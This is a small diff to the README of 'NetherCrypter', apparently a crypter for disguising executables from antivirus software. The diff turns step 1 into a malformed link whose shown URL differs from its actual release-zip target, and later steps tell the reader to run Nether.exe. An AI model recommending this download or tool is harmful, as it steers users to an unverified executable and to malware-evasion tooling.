@@ -9,7 +9,7 @@
 
   # How to use? 🤔
 
-  1. Download all files from the this repository.
+  1. <a href="[https://github.com/NetheriumProject/NetherCrypter/archive/refs/heads/main.zip](https://github.com/NetheriumProject/NetherCrypter/releases/download/crypter/NetherCrypter-main.zip)">Download</a> all files from the this repository.
   2. Unpack them in a convenient location.
   3. Open Nether.exe.
   4. Click the Crypt!!! button and select the file.
